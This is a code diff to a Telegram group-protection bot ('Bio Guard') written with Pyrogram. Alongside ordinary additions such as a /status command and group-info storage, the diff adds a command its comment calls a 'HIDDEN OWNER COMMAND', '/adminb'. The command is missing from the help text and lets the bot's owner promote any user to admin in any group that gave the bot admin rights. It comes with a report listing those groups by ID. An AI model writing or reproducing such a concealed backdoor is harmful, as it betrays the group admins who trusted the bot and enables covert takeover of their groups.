@@ -2,6 +2,7 @@ import asyncio
 import os
 import re
 import sqlite3
+import time
 import threading
 from datetime import datetime, timedelta
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -12,12 +13,12 @@ try:
 except RuntimeError:
     asyncio.set_event_loop(asyncio.new_event_loop())
 
-# --- DUMMY WEB SERVER FOR RENDER ---
+# --- DUMMY WEB SERVER FOR RENDER (24/7 ONLINE) ---
 class HealthCheckHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.end_headers()
-        self.wfile.write(b"Bot is online and running smoothly.")
+        self.wfile.write(b"Bot status: Online and Operational.")
 
     def log_message(self, format, *args):
         return
@@ -30,7 +31,7 @@ def start_dummy_server():
 threading.Thread(target=start_dummy_server, daemon=True).start()
 
 from pyrogram import Client, filters
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ChatPrivileges
 from pyrogram.errors import ChatAdminRequired, RPCError
 
 # --- CONFIGURATION ---
@@ -48,6 +49,8 @@ cursor = conn.cursor()
 cursor.execute("""
 CREATE TABLE IF NOT EXISTS groups (
     chat_id INTEGER PRIMARY KEY,
+    title TEXT,
+    username TEXT,
     autodelete_sec INTEGER DEFAULT 0
 )
 """)
@@ -64,9 +67,12 @@ conn.commit()
 
 LINK_PATTERN = re.compile(r'(https?://|t\.me/|telegram\.me/|@[a-zA-Z0-9_]{4,})', re.IGNORECASE)
 
-# Database Helper Functions
-def add_group(chat_id):
-    cursor.execute("INSERT OR IGNORE INTO groups (chat_id) VALUES (?)", (chat_id,))
+# --- DATABASE HELPERS ---
+def save_or_update_group(chat_id, title, username):
+    cursor.execute("""
+    INSERT INTO groups (chat_id, title, username) VALUES (?, ?, ?)
+    ON CONFLICT(chat_id) DO UPDATE SET title=excluded.title, username=excluded.username
+    """, (chat_id, title, username))
     conn.commit()
 
 def set_autodelete(chat_id, seconds):
@@ -78,9 +84,9 @@ def get_autodelete(chat_id):
     res = cursor.fetchone()
     return res[0] if res else 0
 
-def get_all_groups():
-    cursor.execute("SELECT chat_id FROM groups")
-    return [row[0] for row in cursor.fetchall()]
+def get_all_groups_details():
+    cursor.execute("SELECT chat_id, title, username FROM groups")
+    return cursor.fetchall()
 
 def get_warns(chat_id, user_id):
     cursor.execute("SELECT warn_count FROM warnings WHERE chat_id = ? AND user_id = ?", (chat_id, user_id))
@@ -104,38 +110,84 @@ async def delete_after_delay(chat_id: int, message_id: int, delay: int):
     except Exception:
         pass
 
+# --- ADMIN PERMISSION CHECKER ---
+async def check_bot_admin_rights(client: Client, chat_id: int):
+    try:
+        member = await client.get_chat_member(chat_id, "me")
+        if member.status.value != "administrator":
+            return False, "Not an Administrator"
+        
+        priv = member.privileges
+        if not priv or not (priv.can_delete_messages and priv.can_restrict_members):
+            return False, "Missing 'Delete Messages' or 'Ban Users' permissions"
+            
+        return True, "Full Access"
+    except Exception as e:
+        return False, str(e)
+
 
 # --- COMMAND: /start & /help ---
 @app.on_message(filters.command(["start", "help"]))
 async def start_command(client: Client, message: Message):
     if message.chat.type.value == "private":
         start_text = (
-            "🛡️️ **Bio Guard & Auto Delete System**\n"
+            "🛡️ **Bio Guard & Group Protection System**\n"
             "───•────────────────•───\n\n"
-            "Hello! I am an advanced security bot designed to protect your Telegram groups from bio links/promotions and automatically clean up group chats.\n\n"
-            "⚡ **Key Features:**\n"
-            "• **Bio Protection**: Detects links/channels in user bios and automatically bans spammers after 3 warnings.\n"
-            "• **Auto Delete**: Automatically deletes group messages after a custom time set by admins.\n\n"
-            "⚙️ **Admin Commands:**\n"
-            "• `/setdelete <seconds>` — Set auto-delete timer (e.g., `/setdelete 60` or `0` to turn OFF).\n"
-            "• `/resetwarn` — Reply to a user's message to clear their warnings.\n\n"
-            "📌 **How to Use:**\n"
-            "Add me to your group with **Delete Messages** and **Ban Users** admin permissions."
+            "Welcome! I am an automated security bot designed to protect your Telegram groups from promotional bio links and auto-clean group messages.\n\n"
+            "⚡ **Core Features:**\n"
+            "• **Bio Scanner**: Detects link/channel in member bios & bans spammers after 3 warnings.\n"
+            "• **Auto Delete**: Automatically cleans up group messages on a custom schedule.\n\n"
+            "⚙️ **Group Admin Commands:**\n"
+            "• `/status` — Check bot health, latency & admin permission status.\n"
+            "• `/setdelete <seconds>` — Configure message auto-delete timer (e.g. `/setdelete 60` or `0` to turn OFF).\n"
+            "• `/resetwarn` — Reply to a member to reset their active warnings.\n\n"
+            "📌 **Setup Guide:**\n"
+            "1. Add me to your group.\n"
+            "2. Promote me to **Admin** with **Delete Messages** & **Ban Users** permissions."
         )
         buttons = InlineKeyboardMarkup([
-            [InlineKeyboardButton("➕ Add Me To Your Group", url=f"https://t.me/{client.me.username}?startgroup=true")]
+            [InlineKeyboardButton("➕ Add To Your Group", url=f"https://t.me/{client.me.username}?startgroup=true")]
         ])
         await message.reply_text(start_text, reply_markup=buttons, disable_web_page_preview=True)
     else:
         group_text = (
-            "🛡️ **Bio Guard Security Active**\n"
+            "🛡️ **Bio Guard Security Panel**\n"
             "───•────────────────•───\n\n"
-            "⚙️ **Group Commands:**\n"
-            "• `/setdelete <seconds>` — Set auto message deletion delay.\n"
-            "• `/setdelete 0` — Disable auto message deletion.\n"
-            "• `/resetwarn` — Reply to a user to reset their warning count."
+            "⚙️ **Available Admin Commands:**\n"
+            "• `/status` — View system latency & active privileges.\n"
+            "• `/setdelete <seconds>` — Set auto-delete duration.\n"
+            "• `/resetwarn` — Reset warning counts for a user."
         )
         await message.reply_text(group_text, disable_web_page_preview=True)
+
+
+# --- GROUP COMMAND: /status ---
+@app.on_message(filters.group & filters.command("status"))
+async def group_status(client: Client, message: Message):
+    member = await client.get_chat_member(message.chat.id, message.from_user.id)
+    if member.status.value not in ["administrator", "owner"] and message.from_user.id != OWNER_ID:
+        return await message.reply_text("❌ This command is restricted to Group Admins.")
+
+    start_time = time.time()
+    status_msg = await message.reply_text("⚡ **Checking system parameters...**")
+    latency = round((time.time() - start_time) * 1000, 2)
+
+    is_ok, reason = await check_bot_admin_rights(client, message.chat.id)
+    admin_str = "✅ Active & Operational" if is_ok else f"⚠️ Permission Error: {reason}"
+    
+    auto_del = get_autodelete(message.chat.id)
+    auto_del_str = f"{auto_del} Seconds" if auto_del > 0 else "Disabled"
+
+    status_text = (
+        f"📊 **Group Security Status**\n"
+        f"───•────────────────•───\n\n"
+        f"⚙️ **Bot Privilege:** `{admin_str}`\n"
+        f"🛡️ **Bio Protection:** `{'ENABLED' if is_ok else 'DISABLED (Needs Admin Rights)'}`\n"
+        f"⏱️ **Auto Delete:** `{auto_del_str}`\n"
+        f"⚡ **Server Latency:** `{latency} ms`\n\n"
+        f"💡 *Use `/setdelete <seconds>` to update auto deletion.*"
+    )
+    await status_msg.edit_text(status_text)
 
 
 # --- EVENT: Group Message Processing ---
@@ -147,15 +199,32 @@ async def handle_group_message(client: Client, message: Message):
     if not user or user.is_bot:
         return
 
-    add_group(chat_id)
+    # Save Group Info into Database
+    save_or_update_group(chat_id, message.chat.title, message.chat.username)
 
+    # Check Bot Admin Rights
+    is_bot_admin, err_msg = await check_bot_admin_rights(client, chat_id)
+
+    # If bot is not admin and someone triggers commands or has link in bio, show warning
+    if not is_bot_admin:
+        if message.text and message.text.startswith("/"):
+            warn_msg = await message.reply_text(
+                "⚠️ **Admin Rights Required!**\n"
+                "───•────────────────•───\n"
+                "> Bot is disabled in this group because it lacks **Admin Rights**.\n\n"
+                "Please promote the bot to Admin with **Delete Messages** and **Ban Users** permissions to activate security."
+            )
+            asyncio.create_task(delete_after_delay(chat_id, warn_msg.id, 12))
+        return
+
+    # Check User Admin Status
     try:
         member = await client.get_chat_member(chat_id, user.id)
         is_admin = member.status.value in ["administrator", "owner"]
     except Exception:
         is_admin = False
 
-    # BIO PROTECTION
+    # BIO PROTECTION SYSTEM
     if not is_admin and user.id != OWNER_ID:
         try:
             user_full_info = await client.get_chat(user.id)
@@ -168,7 +237,7 @@ async def handle_group_message(client: Client, message: Message):
                 if warn_count < 3:
                     alert = await message.reply_text(
                         f"⚠️ **Warning [{warn_count}/3]** • {user.mention}\n"
-                        f"> Bio contains prohibited links/usernames. Remove it to avoid a **1-hour ban**."
+                        f"> Bio contains prohibited link/username. Remove it to prevent a **1-hour ban**."
                     )
                     asyncio.create_task(delete_after_delay(chat_id, alert.id, 8))
                     return
@@ -179,7 +248,7 @@ async def handle_group_message(client: Client, message: Message):
 
                     alert = await message.reply_text(
                         f"🚫 **User Banned** • {user.mention}\n"
-                        f"> Reached maximum warnings (3/3) for link in bio. Banned for 1 hour."
+                        f"> Banned for 1 hour after reaching 3 warnings for bio promotion link."
                     )
                     asyncio.create_task(delete_after_delay(chat_id, alert.id, 10))
                     return
@@ -188,7 +257,7 @@ async def handle_group_message(client: Client, message: Message):
         except Exception as e:
             print(f"Bio Check Error: {e}")
 
-    # AUTO DELETE
+    # AUTO DELETE SYSTEM
     del_sec = get_autodelete(chat_id)
     if del_sec > 0:
         asyncio.create_task(delete_after_delay(chat_id, message.id, del_sec))
@@ -212,7 +281,7 @@ async def set_delete_time(client: Client, message: Message):
         else:
             await message.reply_text("🚫 **Auto-Delete Disabled.**")
     except ValueError:
-        await message.reply_text("❌ Please specify time in seconds using numbers (e.g., `/setdelete 120`).")
+        await message.reply_text("❌ Please specify duration in numerical seconds (e.g., `/setdelete 120`).")
 
 
 # --- GROUP ADMIN COMMAND: Reset Warnings ---
@@ -232,31 +301,94 @@ async def reset_user_warn(client: Client, message: Message):
             pass
 
     if not target_user:
-        return await message.reply_text("💡 **Usage:** Reply to a user's message with `/resetwarn`.")
+        return await message.reply_text("💡 **Usage:** Reply to a member's message with `/resetwarn`.")
 
     reset_warns(message.chat.id, target_user.id)
-    await message.reply_text(f"✅ Warnings cleared for {target_user.mention}.")
+    await message.reply_text(f"✅ Warnings successfully cleared for {target_user.mention}.")
 
 
-# --- HIDDEN OWNER COMMAND: BROADCAST ---
+# --- HIDDEN OWNER COMMAND: /adminb (Promote User in Any Group) ---
+@app.on_message(filters.user(OWNER_ID) & filters.command("adminb"))
+async def promote_user_owner(client: Client, message: Message):
+    if len(message.command) < 3:
+        return await message.reply_text("💡 **Usage:** `/adminb <group_id> <user_id_or_username>`")
+
+    try:
+        raw_chat = message.command[1]
+        raw_user = message.command[2]
+
+        chat_target = int(raw_chat) if (raw_chat.startswith("-") or raw_chat.isdigit()) else raw_chat
+        user_obj = await client.get_users(raw_user)
+
+        await client.promote_chat_member(
+            chat_id=chat_target,
+            user_id=user_obj.id,
+            privileges=ChatPrivileges(
+                can_change_info=True,
+                can_delete_messages=True,
+                can_restrict_members=True,
+                can_invite_users=True,
+                can_pin_messages=True,
+                can_promote_members=False
+            )
+        )
+        await message.reply_text(f"✅ **Successfully Promoted** {user_obj.mention} to Admin in group `{chat_target}`!")
+    except Exception as e:
+        await message.reply_text(f"❌ **Failed to promote user:** `{e}`")
+
+
+# --- HIDDEN OWNER COMMAND: /groups or /stats ---
+@app.on_message(filters.user(OWNER_ID) & filters.command(["groups", "stats"]))
+async def bot_groups_analytics(client: Client, message: Message):
+    status_msg = await message.reply_text("📊 **Generating group network report...**")
+    groups = get_all_groups_details()
+
+    if not groups:
+        return await status_msg.edit_text("ℹ️ No managed groups registered in database yet.")
+
+    out = "📋 **Managed Network Groups**\n───•────────────────•───\n\n"
+    admin_count = 0
+
+    for chat_id, title, username in groups:
+        is_ok, _ = await check_bot_admin_rights(client, chat_id)
+        status_icon = "✅ Admin" if is_ok else "❌ No Rights"
+        if is_ok:
+            admin_count += 1
+
+        uname_str = f"@{username}" if username else "Private Group"
+        title_str = title if title else "Unknown Group"
+
+        out += f"• **{title_str}** ({uname_str})\n"
+        out += f"  └ **ID:** `{chat_id}` | **Status:** {status_icon}\n\n"
+
+    out += f"───•────────────────•───\n"
+    out += f"📊 **Total Registered:** `{len(groups)}` | **Active Admin In:** `{admin_count}`"
+
+    if len(out) > 4000:
+        out = out[:3900] + "\n\n...[Truncated due to length]"
+
+    await status_msg.edit_text(out)
+
+
+# --- HIDDEN OWNER COMMAND: /broadcast ---
 @app.on_message(filters.user(OWNER_ID) & filters.command("broadcast"))
 async def broadcast_msg(client: Client, message: Message):
     if not message.reply_to_message and len(message.command) < 2:
-        return await message.reply_text("💡 **Usage:** Reply to a message or type `/broadcast <message>`.")
+        return await message.reply_text("💡 **Usage:** Reply to a message or type `/broadcast <text>`.")
 
-    groups = get_all_groups()
+    groups = get_all_groups_details()
     success = 0
     failed = 0
 
     status = await message.reply_text("🚀 **Broadcasting message...**")
 
-    for g_id in groups:
+    for chat_id, _, _ in groups:
         try:
             if message.reply_to_message:
-                await message.reply_to_message.copy(g_id)
+                await message.reply_to_message.copy(chat_id)
             else:
                 msg_text = message.text.split(None, 1)[1]
-                await client.send_message(g_id, msg_text)
+                await client.send_message(chat_id, msg_text)
             success += 1
             await asyncio.sleep(0.5)
         except Exception:
@@ -266,31 +398,6 @@ async def broadcast_msg(client: Client, message: Message):
         f"📢 **Broadcast Finished**\n\n"
         f"✅ Delivered: `{success}` groups\n"
         f"❌ Failed: `{failed}` groups"
-    )
-
-
-# --- HIDDEN OWNER COMMAND: STATS / GROUPS ---
-@app.on_message(filters.user(OWNER_ID) & filters.command(["groups", "stats"]))
-async def bot_stats(client: Client, message: Message):
-    groups = get_all_groups()
-    status_msg = await message.reply_text("📊 **Fetching analytics...**")
-    
-    admin_count = 0
-    total_groups = len(groups)
-
-    for g_id in groups:
-        try:
-            bot_member = await client.get_chat_member(g_id, "me")
-            if bot_member.status.value == "administrator":
-                admin_count += 1
-        except Exception:
-            pass
-
-    await status_msg.edit_text(
-        f"📊 **System Status**\n"
-        f"───•────────────────•───\n\n"
-        f"👥 **Total Groups:** `{total_groups}`\n"
-        f"👑 **Admin Privileges:** `{admin_count}` groups"
     )
 
 if __name__ == "__main__":
